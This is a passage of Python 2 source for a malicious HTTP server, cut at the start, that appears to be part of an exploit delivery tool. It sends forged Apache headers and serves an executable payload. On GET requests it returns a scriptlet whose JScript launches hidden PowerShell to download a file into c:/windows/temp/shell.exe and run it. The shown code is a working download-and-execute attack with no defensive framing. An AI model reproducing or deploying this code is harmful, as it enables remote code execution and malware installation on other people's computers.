                data = "HTTP/1.1 200 OK\r\nDate: Sun, 16 Apr 2017 18:56:41 GMT\r\nServer: Apache/2.4.25 (Debian)\r\nLast-Modified: Sun, 16 Apr 2017 16:56:22 GMT\r\nAccept-Ranges: bytes\r\nContent-Length: "+str(size)+"\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: application/x-msdos-program\r\n\r\n"
                with open(payloadlocation) as fin:
                    data +=fin.read()
                    conn.send(data)
                    conn.close()
                    sys.exit(1)
            if method in ['GET', 'get']:
                print "Received GET method from "+client_addr[0]
                data = "HTTP/1.1 200 OK\r\nDate: Sun, 16 Apr 2017 17:11:03 GMT\r\nServer: Apache/2.4.25 (Debian)\r\nLast-Modified: Sun, 16 Apr 2017 17:30:47 GMT\r\nAccept-Ranges: bytes\r\nContent-Length: 1000\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: text/scriptlet\r\n\r\n<?XML version=\"1.0\"?>\r\n<package>\r\n<component id='giffile'>\r\n<registration\r\n  description='Dummy'\r\n  progid='giffile'\r\n  version='1.00'\r\n  remotable='True'>\r\n</registration>\r\n<script language='JScript'>\r\n<![CDATA[\r\n  new ActiveXObject('WScript.shell').exec('%SystemRoot%/system32/WindowsPowerShell/v1.0/powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\\'"+payloadurl+"\\', \\'c:/windows/temp/shell.exe\\'); c:/windows/temp/shell.exe');\r\n]]>\r\n</script>\r\n</component>\r\n</package>\r\n"
                conn.send(data)
                conn.close()
                sys.exit(1)
    except socket.error, ex:
        print ex


if __name__ == '__main__':
    main(sys.argv[1:])